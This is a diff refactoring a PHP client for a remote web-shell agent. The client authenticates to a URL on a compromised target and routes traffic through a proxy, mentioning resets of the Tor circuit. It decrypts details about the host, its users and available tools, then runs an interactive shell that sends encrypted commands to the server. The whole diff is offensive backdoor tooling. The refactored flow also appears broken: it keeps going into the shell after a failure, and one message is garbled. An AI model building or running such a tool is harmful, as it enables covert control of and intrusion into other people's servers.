@@ -5,11 +5,9 @@ include './banners.php';
 
 $version = "2.0";
 
-print_help($version);
+print_welcome($version);
 
-$arguments_count = count($argv);
-
-if ($arguments_count == 1) {
+if (count($argv) == 1) {
     echo "\n [-] I need a json file containing the settings. \n\n";
     exit(-1);
 }
@@ -22,18 +20,14 @@ if (!is_readable($file)) {
 }
 
 // Read our config file
-
 $config = json_decode(file_get_contents($file), true);
-
 if (!is_json_valid($config)) {
     echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
     exit(-1);
 }
-
 echo " [+] The json file is valid.\n";
 
 $key      = trim($config['key']);
-$iv       = trim($config['iv']);
 $url      = trim($config['url']);
 $login    = trim($config['login']['username']);
 $password = trim($config['login']['password']);
@@ -65,56 +59,49 @@ $continue = false;
 
 echo " [+] Trying to connect... ";
 
-$result = send_request($url, array(
-    'i' => base64_encode('ping')
-), $login, $password, $proxy, $cookies);
+$result = send_request($url, array('i' => base64_encode('ping')), $login, $password, $proxy, $cookies);
 
-if ($result['status'] == 200) {
-    echo "Good.\n";
-    echo " [+] Let's parse the host information... ";
-    if(strpos($result['content'],'captcha') === false && strpos($result['content'],'openssl_encrypt') === false){
-        $response    = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
-        $username    = base64_decode($response['user']);
-        $path        = base64_decode($response['path']);
-        $hostname    = base64_decode($response['hostname']);
-        $php_version = base64_decode($response['php']);
-        $os          = base64_decode($response['os']);
-        $info        = base64_decode($response['server']);
-        $time        = base64_decode($response['time']);
-        $ip          = base64_decode($response['ip']);
-        $client_ip   = base64_decode($response['client_ip']);
-        $tools       = explode('|', base64_decode($response['tools']));
-        unset($response);
-        if (strlen($time) != 0) {
-            $continue = true;
-            echo "Done.\n";
-        } else {
-            echo "Failed, unable to get some information from the target...\n";
-        }
-    } else {
-        echo "Failed, ";
-        if(strpos($result['content'],'captcha') > -1) {
-            echo "some Captcha was found, try to reset the Tor circuit...\n";
-        } elseif (strpos($result['content'],'openssl_encrypt') > -1){
-            echo "the Target must support Encryption.\n";
-        }
-    }
-} else {
+if ($result['status'] != 200) {
     echo "Failed, agent not found.\n";
-}
-
-if (!$continue) {
     exit(-1);
 }
+
+echo "Good.\n";
+echo " [+] Let's parse the host information... ";
+
+if(strpos($result['content'],'captcha') > -1) {
+    echo "Failed, some Captcha was found, try to reset the Tor circuit...\n";
+} elseif (strpos($result['content'],'openssl_encrypt') > -1){
+    echo "Failed, the Target doesn't Encryption.\n";
+} else {
+    $response    = json_decode(decrypt($result['content'], $key), true);
+    $username    = $response['user'];
+    $path        = $response['path'];
+    $hostname    = $response['hostname'];
+    $php_version = $response['php'];
+    $os          = $response['os'];
+    $info        = $response['server'];
+    $time        = $response['time'];
+    $ip          = $response['ip'];
+    $client_ip   = $response['client_ip'];
+    $tools       = explode('|', $response['tools']);
+    echo "Done.\n";
+    unset($response);
+}
+
 echo " [+] Opening the shell... \n";
+
 sleep(1);
+
 print_banner();
+
 echo "\n";
 echo "\e[37mServer IP\t:=\e[0m \e[97m{$ip}\e[0m\t\n\e[37mClient IP\t:=\e[0m \e[97m{$client_ip}\e[0m\n";
 echo "\e[37mTime @ Server\t:=\e[0m \e[97m{$time}\e[0m\n";
 echo "\e[37mInformation\t:=\e[0m \e[97m".strtoupper($os)."\e[0m\n";
 echo "\e[37mWeb Server\t:=\e[0m \e[97m".strtoupper($info)."\e[0m\n";
 echo "\n";
+
 do {
     $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
     $line   = readline($prefix);
@@ -123,13 +110,13 @@ do {
         "\r"
     ), '', $line));
     if ($cmd != 'exit' && strlen($cmd) > 0) {
-        $data = build_request($cmd, $path, $key, $iv);
+        $data = make_request($cmd, $path, $key);
         if (!isset($data['c']) && !isset($data['f'])) {
             continue;
         }
         $result = send_request($url, $data, $login, $password, $proxy, $cookies);
         if ($result['status'] == 200) {
-            $decrypted_content = encrypt_decrypt('decrypt', $result['content'], $key, $iv);
+            $decrypted_content = decrypt($result['content'], $key);
             $response          = json_decode($decrypted_content, true);
             $path              = base64_decode($response['path']);
             $files             = $response['files'];
